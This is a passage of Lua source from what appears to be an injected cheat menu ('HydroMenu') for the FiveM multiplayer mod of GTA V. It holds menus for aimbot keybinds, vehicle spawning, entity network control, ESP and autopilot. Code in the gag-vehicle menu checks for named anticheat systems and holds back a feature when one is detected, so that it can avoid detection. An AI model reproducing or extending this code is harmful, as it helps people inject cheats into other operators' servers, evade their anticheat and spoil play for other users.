			elseif HydroMenu.Button("Change Armour Refill Key", tostring(HydroVariables.Keybinds.RefilHealthKey), false, "https://docs.fivem.net/docs/game-references/controls/") then
				local RefilArmourKey = HydroMenu.KeyboardEntry("Enter Health Refill Key", 3)
			
				if tonumber(RefilArmourKey) == nil then
					HydroVariables.Keybinds.RefilArmourKey = 999
				else
					HydroVariables.Keybinds.RefilArmourKey = RefilArmourKey
				end
			elseif HydroMenu.Button("Change Aimbot Toggle Key", tostring(HydroVariables.Keybinds.AimBotToggleKey), false, "https://docs.fivem.net/docs/game-references/controls/") then
				local AimbotToggleKey = HydroMenu.KeyboardEntry("Enter Aimbot Toggle Key", 3)
			
				if tonumber(AimbotToggleKey) == nil then
					HydroVariables.Keybinds.AimbotToggleKey = 999
				else
					HydroVariables.Keybinds.AimbotToggleKey = AimbotToggleKey
				end
			end

			HydroMenu.Display()
		elseif HydroMenu.IsMenuOpened('menusettings') then
			if HydroMenu.MenuButton("Themes", "menuthemes") then
			elseif HydroMenu.MenuButton("Keybinds", "keybinds") then
			elseif HydroMenu.CheckBox("Discord Presence", HydroVariables.MenuOptions.DiscordRichPresence) then
				HydroVariables.MenuOptions.DiscordRichPresence = not HydroVariables.MenuOptions.DiscordRichPresence

				if not HydroVariables.MenuOptions.DiscordRichPresence then
                    SetDiscordAppId(0)
					SetDiscordRichPresenceAsset(0)
					SetDiscordRichPresenceAssetText(0)
					SetDiscordRichPresenceAssetSmall(0)
					SetDiscordRichPresenceAssetSmallText(0)
				end

			elseif HydroMenu.CheckBox("GTA Keyboard Input", HydroMenu.UI.GTAInput) then
				HydroMenu.UI.GTAInput = not HydroMenu.UI.GTAInput
			elseif HydroMenu.CheckBox("Watermark", HydroVariables.MenuOptions.Watermark) then
				HydroVariables.MenuOptions.Watermark = not HydroVariables.MenuOptions.Watermark
			elseif HydroMenu.ValueChanger("Maximum Option Count", HydroMenu.UI.MaximumOptionCount, 1, {1, 19}, function(val)
				HydroMenu.UI.MaximumOptionCount = val
			end) then
			elseif HydroMenu.ValueChanger("Menu X", HydroMenu.UI.MenuX, 0.01, {0.025, 0.99 - HydroMenu.menus[HydroMenu.currentMenu].width}, function(val)
				HydroMenu.UI.MenuX = val
				HydroMenu.SetMenuProperty(HydroMenu.currentMenu, 'x', HydroMenu.UI.MenuX)
			end) then
			elseif HydroMenu.ValueChanger("Menu Y", HydroMenu.UI.MenuY, 0.01, {0.025, 0.2}, function(val)
				HydroMenu.UI.MenuY = val
				HydroMenu.SetMenuProperty(HydroMenu.currentMenu, 'y', HydroMenu.UI.MenuY)
			end) then
			elseif HydroMenu.ValueChanger("Notification X", HydroMenu.UI.NotificationX, 0.01, {0.025, 0.690}, function(val)
				HydroMenu.UI.NotificationX = val
			end) then
			elseif HydroMenu.ValueChanger("Notification Y", HydroMenu.UI.NotificationY, 0.01, {0.025, 0.5}, function(val)
				HydroMenu.UI.NotificationY = val
			end) then
			elseif HydroMenu.Button("Injected at " .. InjectionTime) then
			elseif HydroMenu.Button("Menu Version: " ..HydroMenu.Version) then
			end
			
			if HydroMenu.menus[HydroMenu.currentMenu].currentOption == 9 or HydroMenu.menus[HydroMenu.currentMenu].currentOption == 10 then
				PushNotification("Notifications Look Like This", 1)
			end
			HydroMenu.Display()
		elseif HydroMenu.IsMenuOpened('worldoptions') then
			if HydroMenu.MenuButton('Weather Options', 'weatheroptions', "Set the Weather") then
			elseif HydroMenu.MenuButton('Time Options', 'timeoptions', "Set the Time") then
			end
			HydroMenu.Display()
		elseif HydroMenu.IsMenuOpened('doorvehicleoptions') then
			
			if HydroMenu.Button("Open All Doors", "", false, "Opens All Doors") then
				for door = 0, 7 do
					SetVehicleDoorOpen(GetPlayersLastVehicle(), door, false, false)
				end
			elseif HydroMenu.Button("Close All Doors", "", false, "Close All Doors") then
				for door = 0, 7 do
					SetVehicleDoorShut(GetPlayersLastVehicle(), door, false)
				end
			elseif HydroMenu.Button("Break All Doors", "", false, "Make all doors fall off") then
				for door = 0, 7 do
					SetVehicleDoorBroken(GetPlayersLastVehicle(), door, false)
				end
			elseif HydroMenu.ComboBox("Open Door", {"Left Front", "Right Front", "Left Back", "Right Back", "Hood", "Trunk"}, curDoorIndex, function(currentIndex, selectedIndex)
				curDoorIndex = currentIndex
				selDoorIndex = currentIndex
				end) then

				SetVehicleDoorOpen(GetPlayersLastVehicle(), selDoorIndex - 1, false, false)
			elseif HydroMenu.ComboBox("Close Door", {"Left Front", "Right Front", "Left Back", "Right Back", "Hood", "Trunk"}, curClosedDoorIndex, function(currentIndex, selectedIndex)
				curClosedDoorIndex = currentIndex
				selClosedDoorIndex = currentIndex
				end) then
	
				SetVehicleDoorShut(GetPlayersLastVehicle(), selClosedDoorIndex - 1, false)
			elseif HydroMenu.ComboBox("Break Door", {"Left Front", "Right Front", "Left Back", "Right Back", "Hood", "Trunk"}, curClosedBreakIndex, function(currentIndex, selectedIndex)
				curClosedBreakIndex = currentIndex
				selClosedBreakIndex = currentIndex
				end) then
	
				SetVehicleDoorBroken(GetPlayersLastVehicle(), selClosedBreakIndex - 1, false)
			end

			HydroMenu.Display()
		elseif HydroMenu.IsMenuOpened('selectectedcatagoryvehicleoptions') then
			local menu = HydroMenu.menus[HydroMenu.currentMenu]
			local catagory = HydroMenu.menus[HydroMenu.currentMenu].subTitle

			if VehicleList[catagory] ~= nil then
				for i = 1, #VehicleList[catagory] do
					if HydroMenu.Button(VehicleList[catagory][i]) then
						RequestModel(GetHashKey(VehicleList[catagory][i]))
	
						local loops = 0
	
						while not HasModelLoaded(GetHashKey(VehicleList[catagory][i])) and loops < 500 do
							loops = loops + 1
							Wait(1)
						end
						
						if spawninsidevehicle then
							local coords = GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 8.0, 0.5)
							local SpawnedCar = CreateVehicle(GetHashKey(VehicleList[catagory][i]), coords.x, coords.y, coords.z, GetEntityHeading(PlayerPedId()), 1, 1)	  
							SetPedInVehicleContext(PlayerPedId(), GetHashKey(VehicleList[catagory][i]))
							SetPedIntoVehicle(PlayerPedId(), SpawnedCar, -1)
							if CustomSpawnColour then
								local r,g,b = table.unpack(defaultvehcolor)
								SetVehicleCustomPrimaryColour(SpawnedCar, r, g, b)
								SetVehicleCustomSecondaryColour(SpawnedCar, r, g, b)
							end
						else
							local coords = GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 8.0, 0.5)
							local SpawnedCar = CreateVehicle(GetHashKey(VehicleList[catagory][i]), coords.x, coords.y, coords.z, GetEntityHeading(PlayerPedId()), 1, 1)
							if CustomSpawnColour then
								local r,g,b = table.unpack(defaultvehcolor)
								SetVehicleCustomPrimaryColour(SpawnedCar, r, g, b)
								SetVehicleCustomSecondaryColour(SpawnedCar, r, g, b)
							end
						end
					end
				end
		    end
		
			HydroMenu.Display()
		elseif HydroMenu.IsMenuOpened('spawnvehiclesettings') then
			if HydroMenu.CheckBox("Spawn Inside", spawninsidevehicle) then
				spawninsidevehicle = not spawninsidevehicle
			elseif HydroMenu.CheckBox("Spawn with Custom Colour", CustomSpawnColour) then
				CustomSpawnColour = not CustomSpawnColour
			elseif HydroMenu.Button("Set Vehicle Spawn Colour") then
				local r = HydroMenu.KeyboardEntry("Enter Red Value 0 - 255", 3)
				local g = HydroMenu.KeyboardEntry("Enter Green Value 0 - 255", 3)
				local b = HydroMenu.KeyboardEntry("Enter Blue Value 0 - 255", 3)
				r = tonumber(r)
				g = tonumber(g)
				b = tonumber(b)
				if r == nil or g == nil or b == nil then
				elseif r  < 0 or g < 0 or b < 0 or r > 255 or g > 255 or b > 255 then
				else
					defaultvehcolor = { r,g,b }
				end
			end
			HydroMenu.Display()
		elseif HydroMenu.IsMenuOpened('spawnvehicleoptions') then

			if HydroMenu.MenuButton("Spawn Settings", "spawnvehiclesettings") then
			elseif HydroMenu.Button("Input Vehicle Spawn Code") then
				local coords = GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 8.0, 0.5)
				local result = HydroMenu.KeyboardEntry("Enter Vehcle Spawn Name", 200)

				if HasModelLoaded(GetHashKey(result)) then

				else
					RequestModel(GetHashKey(result))
					Wait(500)
				end
				
				CancelOnscreenKeyboard()
					
				local vehicle = CreateVehicle(GetHashKey(result), coords.x + 1.0, coords.y + 1.0, coords.z, 0.0, 1, 1)
				if CustomSpawnColour then
					local r,g,b = table.unpack(defaultvehcolor)
					SetVehicleCustomPrimaryColour(vehicle, r, g, b)
					SetVehicleCustomSecondaryColour(vehicle, r, g, b)
				end
				SetVehicleNeedsToBeHotwired(vehicle, false)
				SetEntityHeading(vehicle, GetEntityHeading(PlayerPedId()))
				SetVehicleEngineOn(vehicle, true, false, false)
				SetVehRadioStation(vehicle, 'OFF')
				if spawninsidevehicle then
					SetPedIntoVehicle(PlayerPedId(), vehicle, -1)
				end

				CancelOnscreenKeyboard()
			elseif HydroMenu.MenuButton("Funny Vehicles", "funnyvehicles") then
			end

			for i = 1, #VehicleList.Catagories do
				if HydroMenu.MenuButton(VehicleList.Catagories[i], "selectectedcatagoryvehicleoptions") then
					HydroMenu.SetMenuProperty('selectectedcatagoryvehicleoptions', 'subTitle', VehicleList.Catagories[i])
				end
			end
 
			HydroMenu.Display()

		elseif HydroMenu.IsMenuOpened('funnyvehicles') then
			
			if HydroMenu.Button("UFO") then

				if AntiCheats.ChocoHax or AntiCheats.WaveSheild or AntiCheats.BadgerAC then
					PushNotification("Anticheat Detected! Function Blocked", 600)
				else
					UFOVeh(-1)
				end

			elseif HydroMenu.Button("T20 Ramp Car") then

				RampCar(-1)

			elseif HydroMenu.Button("Armoured Banshee") then
				RequestModel(GetHashKey("banshee"))
				RequestModel(GetHashKey("kuruma2"))

				local r = math.random(1, 254)
				local g = math.random(1, 254)
				local b = math.random(1, 254)

				Wait(500)

				local coords = GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 8.0, 0.5)

				local vehicle = CreateVehicle(GetHashKey("banshee"), coords.x, coords.y, coords.z, 0.0, 1, 1)
				local vehicle2 = CreateVehicle(GetHashKey("kuruma2"), coords.x, coords.y, coords.z, 0.0, 1, 1)

				SetEntityHeading(vehicle, GetEntityHeading(PlayerPedId()))

				AttachEntityToEntity(vehicle2, vehicle, 0, 0.0, -0.11, -0.0100, 0.5, 0.0, 0.0, true, true, false, false, true, true)

				SetVehicleCanBreak(vehicle2, false)

				WashDecalsFromVehicle(vehicle, 1.0)
				SetVehicleDirtLevel(vehicle)
				WashDecalsFromVehicle(vehicle2, 1.0)
				SetVehicleDirtLevel(vehicle2)
				SetVehicleCustomPrimaryColour(vehicle, r, g, b)
				SetVehicleCustomSecondaryColour(vehicle, r, g, b)
				SetVehicleModColor_1(vehicle, 4, 255, 0)
				SetVehicleModColor_1(vehicle2, 4, 255, 0)

				SetVehicleCustomPrimaryColour(vehicle2, r, g, b)
				SetEntityHeading(vehicle, GetEntityHeading(PlayerPedId()))

				SetPedIntoVehicle(PlayerPedId(), vehicle, -1)
			elseif HydroMenu.Button("Boombox Car") then
				RequestModel(GetHashKey("surano"))
				RequestModel(GetHashKey("prop_speaker_05"))
				RequestModel(GetHashKey("prop_speaker_03"))
				RequestModel(GetHashKey("prop_speaker_01"))

				local coords = GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 8.0, 0.5)

				local vehicle = CreateVehicle(GetHashKey("surano"), coords.x, coords.y, coords.z, 0.0, 1, 1)
				local frontspeaker = CreateObject(GetHashKey("prop_speaker_05"), 9, 9, 9, 1, 1, 1)
				local secondspeaker = CreateObject(GetHashKey("prop_speaker_01"), 9, 9, 9, 1, 1, 1)
				local thirdspeaker = CreateObject(GetHashKey("prop_speaker_03"), 9, 9, 9, 1, 1, 1)
				local fourthspeaker = CreateObject(GetHashKey("prop_speaker_03"), 9, 9, 9, 1, 1, 1)

				AttachEntityToEntity(frontspeaker, vehicle, 0, 0.0, 1.8830, 0.2240, 0.0, 0.0, 180.0, true, true, false, false, true, true)
				AttachEntityToEntity(secondspeaker, vehicle, 0, 0.0, -1.23, -0.24, 0.0, 0.0, 180.0, true, true, false, false, true, true)
				AttachEntityToEntity(thirdspeaker, vehicle, 0, -0.6, -1.5, 0.25, 0.0, 0.0, 0.0, true, true, false, false, true, true)
				AttachEntityToEntity(fourthspeaker, thirdspeaker, 0, 1.2, 0.0, 0.0, 0.0, 0.0, 0.0, true, true, false, false, true, true)

				SetVehicleCustomPrimaryColour(vehicle, 0, 0, 0)

				SetEntityHeading(vehicle, GetEntityHeading(PlayerPedId()))
				
				SetPedIntoVehicle(PlayerPedId(), vehicle, -1)
			end

			HydroMenu.Display()
		elseif HydroMenu.IsMenuOpened('Hydrocustoms') then
			
			local inveh = IsPedInAnyVehicle(PlayerPedId(), false)

			if HydroMenu.Button("Set Vehicle License Plate", "", false, "Set License") then
				license = HydroMenu.KeyboardEntry("Vehicle License Plate", 8)
				SetVehicleNumberPlateText(GetVehiclePedIsIn(PlayerPedId()), license)
				
			elseif HydroMenu.Button("Set Vehicle Paint") then
				local playerVeh = GetVehiclePedIsIn(PlayerPedId(), true)
				local r = HydroMenu.KeyboardEntry("Red Colour | Number Between 0-255", 3)
				local g = HydroMenu.KeyboardEntry("Green Colour | Number Between 0-255", 3)
				local b = HydroMenu.KeyboardEntry("Blue Colour | Number Between 0-255", 3)

				r = tonumber(r)
				g = tonumber(g)
				b = tonumber(b)

				if r == nil then
					r = 0
				end
				if g == nil then
					g = 0
				end
				if b == nil then
					b = 0
				end

				if r > 255 then
					r = 255
				end
				if r < 0 then
					r = 0
				end
				if g > 255 then
					g = 255
				end
				if g < 0 then
					g = 0
				end
				if b > 255 then
					b = 255
				end
				if b < 0 then
					b = 0
				end

				SetVehicleCustomPrimaryColour(playerVeh, r, g, b)
				SetVehicleCustomSecondaryColour(playerVeh, r, g, b)
		    elseif HydroMenu.Button("Max Out Vehicle", "", false, "Max Out Engine and the Bodywork") then
			    MaxOut(GetVehiclePedIsIn(PlayerPedId(), 0))
		    end
			if HydroMenu.Button("Helicopter Blades Under Car") then
				for i = 1, 5 do 
					
			     	local ped = PlayerPedId()
			     	local coords = GetEntityCoords(ped)
					local vehicleplyr = GetVehiclePedIsIn(ped, 0)
				
			     	local pedmodel = "a_m_m_eastsa_01"
			     	local planemodel = "buzzard"
			
			     	RequestModel(GetHashKey(pedmodel))
			     	RequestModel(GetHashKey(planemodel))
			
			     	local loadattemps = 0
			
			     	while not HasModelLoaded(GetHashKey(pedmodel)) do
						loadattemps = loadattemps + 1
						Citizen.Wait(1)
						if loadattemps > 10000 then
							break
						end
					end
			
					while not HasModelLoaded(GetHashKey(planemodel)) and loadattemps < 10000 do
						Wait(500)
					end
				
					local nped = CreatePed(4, pedmodel, coords.x, coords.y, coords.z, 0.0, true, true)
			
					local veh = CreateVehicle(GetHashKey(planemodel), coords.x, coords.y, coords.z + 50.0, GetEntityHeading(ped), 1, 1)
				
					ClearPedTasks(nped)
				
					SetPedIntoVehicle(nped, veh, -1)
			
					SetPedKeepTask(nped, true)

					AttachEntityToEntity(veh, vehicleplyr, 0, 0.0, 0.0, -2.5, 0.0, 0.0, 0.0, false, false, true, false, 0, true)

					SetVehicleCanBreak(veh, false)

				end
			end

			HydroMenu.Display()
		elseif HydroMenu.IsMenuOpened('vehicletricks') then
			if HydroMenu.Button("Do a Kick Flip", "", "Do a Kickflip") then
				local playerPed = PlayerPedId()
				local playerVeh = GetVehiclePedIsIn(playerPed, true)
			       
	            if DoesEntityExist(playerVeh) then
				    ApplyForceToEntity(playerVeh, 1, 0.0, 0.0, 10.0, 90.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
				end
			elseif HydroMenu.Button("Do a Back Flip") then
				local playerPed = PlayerPedId()
				local playerVeh = GetVehiclePedIsIn(playerPed, true)
			       
	            if DoesEntityExist(playerVeh) then
				    ApplyForceToEntity(playerVeh, 1, 0.0, 0.0, 15.0, 0.0, 60.0, 0.0, 0, 0, 1, 1, 0, 0)
				end
			elseif HydroMenu.Button("Do a Jump") then
				local playerPed = PlayerPedId()
				local playerVeh = GetVehiclePedIsIn(playerPed, true)
			       
	            if DoesEntityExist(playerVeh) then
				    ApplyForceToEntity(playerVeh, 1, 0.0, 0.0, 15.0, 0.0, 0.0, 00.0, 0, 1, 0, 1, 0, 0)
				end
			end

			HydroMenu.Display()
		elseif HydroMenu.IsMenuOpened('personalvehicleautopilot') then
			if HydroMenu.Button("Teleport Self Into Vehicle") then
				SetPedIntoVehicle(PlayerPedId(), HydroVariables.VehicleOptions.PersonalVehicle, -1)
			elseif HydroMenu.Button("Teleport Vehicle To Self") then
				SetEntityCoords(HydroVariables.VehicleOptions.PersonalVehicle, GetEntityCoords(PlayerPedId()))
			elseif HydroMenu.Button("Auto Pilot Vehicle To Self", "", false, "Dude WTF How do you do that") then
				if GetVehiclePedIsUsing(PlayerPedId()) == HydroVariables.VehicleOptions.PersonalVehicle then
					PVAutoDriving = false
				else
					PVAutoDriving = true
					Citizen.CreateThread(function()
						if DoesEntityExist(Driver) then
							DeleteEntity(Driver)
						end
						Driver = CreatePed(5, GetEntityModel(PlayerPedId()), spawnCoords, spawnHeading, true)
						TaskWarpPedIntoVehicle(Driver, HydroVariables.VehicleOptions.PersonalVehicle, -1)
						SetEntityVisible(Driver, false)
						while not killmenu and PVAutoDriving do
							SetPedMaxHealth(Driver, 10000)
							SetEntityHealth(Driver, 10000)
							SetEntityInvincible(Driver, false)
							SetPedCanRagdoll(Driver, true)
							ClearPedLastWeaponDamage(Driver)
							SetEntityProofs(Driver, false, false, false, false, false, false, false, false)
							SetEntityOnlyDamagedByPlayer(Driver, true)
							SetEntityCanBeDamaged(Driver, true)

							if not DoesEntityExist(HydroVariables.VehicleOptions.PersonalVehicle) or not DoesEntityExist(Driver) then
								break
							end
							Wait(100)
							coords = GetEntityCoords(HydroVariables.VehicleOptions.PersonalVehicle)
							plycoords = GetEntityCoords(PlayerPedId())
							TaskVehicleDriveToCoordLongrange(Driver, HydroVariables.VehicleOptions.PersonalVehicle, plycoords.x, plycoords.y, plycoords.z, 25.0, 1074528293, 1.0)
							SetVehicleLightsMode(HydroVariables.VehicleOptions.PersonalVehicle, 2)
							distance = GetDistanceBetweenCoords(coords.x, coords.y, coords.z, plycoords.x, plycoords.y, coords.z, true)
							if IsVehicleStuckOnRoof(HydroVariables.VehicleOptions.PersonalVehicle) then
								SetVehicleCoords(HydroVariables.VehicleOptions.PersonalVehicle, GetEntityCoords(HydroVariables.VehicleOptions.PersonalVehicle))
							end
							if distance < 5.0 then
								PushNotification("Your Personal Vehicle has Arrived")
								SetVehicleForwardSpeed(HydroVariables.VehicleOptions.PersonalVehicle, 1.0)
								DeleteEntity(Driver)
								PVAutoDriving = false
								return
							end
						end
					end)
				end
			
			elseif HydroMenu.Button("Auto Pilot Vehicle To Waypoint", "", false, "Dude WTF How do you do that") then
				local plycoords = GetBlipCoords(GetFirstBlipInfoId(8))
				if GetVehiclePedIsUsing(PlayerPedId()) == HydroVariables.VehicleOptions.PersonalVehicle then
					PVAutoDriving = false
				else
					PVAutoDriving = true
					Citizen.CreateThread(function()
						if DoesEntityExist(Driver) then
							DeleteEntity(Driver)
						end
						Driver = CreatePed(5, GetEntityModel(PlayerPedId()), spawnCoords, spawnHeading, true)
						TaskWarpPedIntoVehicle(Driver, HydroVariables.VehicleOptions.PersonalVehicle, -1)
						SetEntityVisible(Driver, false)
				
						while not killmenu and PVAutoDriving do
							if not DoesEntityExist(HydroVariables.VehicleOptions.PersonalVehicle) or not DoesEntityExist(Driver) then
								break
							end
							Wait(100)
							coords = GetEntityCoords(HydroVariables.VehicleOptions.PersonalVehicle)
							TaskVehicleDriveToCoordLongrange(Driver, HydroVariables.VehicleOptions.PersonalVehicle, plycoords.x, plycoords.y, plycoords.z, 25.0, 1074528293, 1.0)
							SetVehicleLightsMode(HydroVariables.VehicleOptions.PersonalVehicle, 2)
							distance = GetDistanceBetweenCoords(coords.x, coords.y, coords.z, plycoords.x, plycoords.y, coords.z, true)
							if IsVehicleStuckOnRoof(HydroVariables.VehicleOptions.PersonalVehicle) then
								SetVehicleCoords(HydroVariables.VehicleOptions.PersonalVehicle, GetEntityCoords(HydroVariables.VehicleOptions.PersonalVehicle))
							end
							if distance < 5.0 then
								SetVehicleForwardSpeed(HydroVariables.VehicleOptions.PersonalVehicle, 1.0)
								DeleteEntity(Driver)
								PVAutoDriving = false
								return
							end
						end
					end)
				end
			
			elseif HydroMenu.Button("Auto Pilot Vehicle Around Area", "", false, "Dude WTF How do you do that") then
				Driver = CreatePed(5, GetEntityModel(PlayerPedId()), spawnCoords, spawnHeading, true)
				TaskWarpPedIntoVehicle(Driver, HydroVariables.VehicleOptions.PersonalVehicle, -1)
				SetEntityVisible(Driver, false)
				TaskVehicleDriveWander(Driver, HydroVariables.VehicleOptions.PersonalVehicle, 50.0, 5)
			elseif HydroMenu.Button("Cancel Auto Pilot", "", false, "Dude Thats INSANE") then
				PVAutoDriving = false
				if DoesEntityExist(Driver) then
					DeleteEntity(Driver)
				end
			elseif PVAutoDriving and HydroMenu.Button("Teleport Vehicle Forward") then
				offset = GetOffsetFromEntityInWorldCoords(HydroVariables.VehicleOptions.PersonalVehicle, 0.0, 5.0, 0.5)
				SetEntityCoords(HydroVariables.VehicleOptions.PersonalVehicle, offset.x, offset.y, offset.z, 0, 0, 0, 0)
			elseif PVAutoDriving and HydroMenu.Button("Teleport Vehicle Back") then
				offset = GetOffsetFromEntityInWorldCoords(HydroVariables.VehicleOptions.PersonalVehicle, 0.0, -5.0, 0.5)
				SetEntityCoords(HydroVariables.VehicleOptions.PersonalVehicle, offset.x, offset.y, offset.z, 0, 0, 0, 0)
			end

			HydroMenu.Display()
		elseif HydroMenu.IsMenuOpened('personalvehicle') then

			if not DoesEntityExist(HydroVariables.VehicleOptions.PersonalVehicle) then
                HydroVariables.VehicleOptions.PersonalVehicle = false
			end

			if HydroVariables.VehicleOptions.PersonalVehicle == false then

				HydroVariables.VehicleOptions.PersonalVehicleESP = false
				HydroVariables.VehicleOptions.PersonalVehicleMarker = false
				PVLocked = false
				PVLockedForSelf = false
				
				if HydroMenu.Button("Set Personal Vehicle") then
					HydroVariables.VehicleOptions.PersonalVehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
					SetEntityAsMissionEntity(HydroVariables.VehicleOptions.PersonalVehicle, 1, 1)
				end
			end

			if HydroVariables.VehicleOptions.PersonalVehicle ~= false then
				if HydroMenu.MenuButton("Auto Pilot", "personalvehicleautopilot") then
				elseif HydroMenu.Button("Remove Personal Vehicle") then
					HydroVariables.VehicleOptions.PersonalVehicle = false
					SetEntityAsMissionEntity(HydroVariables.VehicleOptions.PersonalVehicle, 0, 0)
			    elseif HydroMenu.Button("Repair Vehicle") then
					NetworkRequestControlOfNetworkId(VehToNet(HydroVariables.VehicleOptions.PersonalVehicle))
					if NetworkHasControlOfNetworkId(VehToNet(HydroVariables.VehicleOptions.PersonalVehicle)) then
						SetVehicleEngineHealth(HydroVariables.VehicleOptions.PersonalVehicle, 1000)
						SetVehicleFixed(HydroVariables.VehicleOptions.PersonalVehicle)
					else
                        NetworkRequestControlOfNetworkId(VehToNet(HydroVariables.VehicleOptions.PersonalVehicle))
					end
			    elseif HydroMenu.Button("Burst Vehicle Tyres") then
					NetworkRequestControlOfNetworkId(VehToNet(HydroVariables.VehicleOptions.PersonalVehicle))
					if NetworkHasControlOfNetworkId(VehToNet(HydroVariables.VehicleOptions.PersonalVehicle)) then
						SetVehicleTyreBurst(HydroVariables.VehicleOptions.PersonalVehicle, 0, true, 1000.0)
						SetVehicleTyreBurst(HydroVariables.VehicleOptions.PersonalVehicle, 1, true, 1000.0)
						SetVehicleTyreBurst(HydroVariables.VehicleOptions.PersonalVehicle, 2, true, 1000.0)
						SetVehicleTyreBurst(HydroVariables.VehicleOptions.PersonalVehicle, 3, true, 1000.0)
						SetVehicleTyreBurst(HydroVariables.VehicleOptions.PersonalVehicle, 4, true, 1000.0)
						SetVehicleTyreBurst(HydroVariables.VehicleOptions.PersonalVehicle, 5, true, 1000.0)
						SetVehicleTyreBurst(HydroVariables.VehicleOptions.PersonalVehicle, 4, true, 1000.0)
						SetVehicleTyreBurst(HydroVariables.VehicleOptions.PersonalVehicle, 7, true, 1000.0)
					else
                        NetworkRequestControlOfNetworkId(VehToNet(HydroVariables.VehicleOptions.PersonalVehicle))
					end
				elseif HydroMenu.CheckBox("Siern", VehicleSiren) then
					VehicleSiren = not VehicleSiren
					SetVehicleSiren(HydroVariables.VehicleOptions.PersonalVehicle, VehicleSiren)
				elseif HydroMenu.CheckBox("Locked", PVLocked) then
					PVLocked = not PVLocked
					RequestControlOnce(HydroVariables.VehicleOptions.PersonalVehicle)
					SetVehicleDoorsLocked(HydroVariables.VehicleOptions.PersonalVehicle, PVLocked)
					SetVehicleDoorsLockedForAllPlayers(HydroVariables.VehicleOptions.PersonalVehicle, PVLocked)
					if PVLocked == false then
						PVLockedForSelf = false
					end
				elseif PVLocked and HydroMenu.CheckBox("Unlocked For Self", PVLockedForSelf, "The Car is locked for everyone but you") then
					PVLockedForSelf = not PVLockedForSelf
					RequestControlOnce(HydroVariables.VehicleOptions.PersonalVehicle)
					SetVehicleDoorsLockedForPlayer(HydroVariables.VehicleOptions.PersonalVehicle, PlayerId(), not PVLockedForSelf)
				elseif PVLocked and HydroMenu.CheckBox("Unlocked For Friends", PVLockedForFriends, "The Car is locked for everyone but yourfriends") then
					PVLockedForFriends = not PVLockedForFriends
					RequestControlOnce(HydroVariables.VehicleOptions.PersonalVehicle)
					for i = 1, #FriendsList do
					    SetVehicleDoorsLockedForPlayer(HydroVariables.VehicleOptions.PersonalVehicle, FriendsList[i], not PVLockedForFriends)
					end
				elseif HydroMenu.CheckBox("Camera", HydroVariables.VehicleOptions.PersonalVehicleCam) then
					if HydroVariables.VehicleOptions.PersonalVehicleCam then
                        EndPersonalVehicleCam()
					else
                        StartPersonalVehicleCam()
					end
				elseif HydroMenu.CheckBox("ESP", HydroVariables.VehicleOptions.PersonalVehicleESP) then
					HydroVariables.VehicleOptions.PersonalVehicleESP = not HydroVariables.VehicleOptions.PersonalVehicleESP
				elseif HydroMenu.CheckBox("Blip", HydroVariables.VehicleOptions.PersonalVehicleMarker) then
					HydroVariables.VehicleOptions.PersonalVehicleMarker = not HydroVariables.VehicleOptions.PersonalVehicleMarker
				elseif HydroMenu.ComboBox("Open Vehicle Doors", {"Left Front", "Right Front", "Left Back", "Right Back", "Hood", "Trunk"}, HydroVariables.VehicleOptions.CurDoorPV, function(currentIndex, selectedIndex)
					
					HydroVariables.VehicleOptions.CurDoorPV = currentIndex

				end) then
					SetVehicleDoorOpen(GetPlayersLastVehicle(), HydroVariables.VehicleOptions.SelDoorPV - 1, false, false)
				elseif HydroMenu.ComboBox("Close Vehicle Doors", {"Left Front", "Right Front", "Left Back", "Right Back", "Hood", "Trunk"}, HydroVariables.VehicleOptions.CurCloseDoorPV, function(currentIndex, selectedIndex)
					
					HydroVariables.VehicleOptions.CurCloseDoorPV = currentIndex

				end) then
					SetVehicleDoorShut(GetPlayersLastVehicle(), HydroVariables.VehicleOptions.SelCloseDoorPV - 1, false, false)
				end
			end
			HydroMenu.Display()
		elseif HydroMenu.IsMenuOpened('vehicleautopilot') then

			if HydroMenu.Button("Drive To Waypoint") then
				autodriving = true
				local waypoint = GetFirstBlipInfoId(8)
				if DoesBlipExist(waypoint) then
					coords = GetBlipInfoIdCoord(waypoint)
					TaskVehicleDriveToCoordLongrange(PlayerPedId(), GetVehiclePedIsUsing(PlayerPedId()), coords.x, coords.y, coords.z, HydroVariables.VehicleOptions.AutoPilotOptions.CruiseSpeed, HydroVariables.VehicleOptions.AutoPilotOptions.DrivingStyle, 10.0)
					Citizen.CreateThread(function()
						while not killmenu and autodriving do
							Wait(1000)
							plycoords = GetEntityCoords(PlayerPedId())
							distance = GetDistanceBetweenCoords(coords.x, coords.y, coords.z, plycoords.x, plycoords.y, coords.z, false)
							if distance < 10.0 then
								ClearPedTasks(PlayerPedId())
								PushNotification("You have arrived at your Destination", 600)
								SetDriveTaskCruiseSpeed(PlayerPedId(), 0)
								autodriving = false
							end
						end
					end)
				end
			elseif HydroMenu.ComboBox("Driving Style", HydroVariables.VehicleOptions.AutoPilotOptions.DrivingStyles, HydroVariables.VehicleOptions.AutoPilotOptions.CurCruiseSpeedIndex, function(currentIndex)
					
				HydroVariables.VehicleOptions.AutoPilotOptions.CurCruiseSpeedIndex = currentIndex

			end) then
				
				if HydroVariables.VehicleOptions.AutoPilotOptions.SelCruiseSpeedIndex == 1 then
					HydroVariables.VehicleOptions.AutoPilotOptions.DrivingStyle = 6
				elseif HydroVariables.VehicleOptions.AutoPilotOptions.SelCruiseSpeedIndex == 2 then
					HydroVariables.VehicleOptions.AutoPilotOptions.DrivingStyle = 5
				elseif HydroVariables.VehicleOptions.AutoPilotOptions.SelCruiseSpeedIndex == 3 then
					HydroVariables.VehicleOptions.AutoPilotOptions.DrivingStyle = 1074528293
				elseif HydroVariables.VehicleOptions.AutoPilotOptions.SelCruiseSpeedIndex == 4 then
					HydroVariables.VehicleOptions.AutoPilotOptions.DrivingStyle = 786603
				elseif HydroVariables.VehicleOptions.AutoPilotOptions.SelCruiseSpeedIndex == 5 then
					HydroVariables.VehicleOptions.AutoPilotOptions.DrivingStyle = 2883621
				elseif HydroVariables.VehicleOptions.AutoPilotOptions.SelCruiseSpeedIndex == 6 then
					HydroVariables.VehicleOptions.AutoPilotOptions.DrivingStyle = 786468 
				end
			elseif HydroMenu.Button("Speed",  "ᐊ " .. HydroVariables.VehicleOptions.AutoPilotOptions.CruiseSpeed .. " ") then
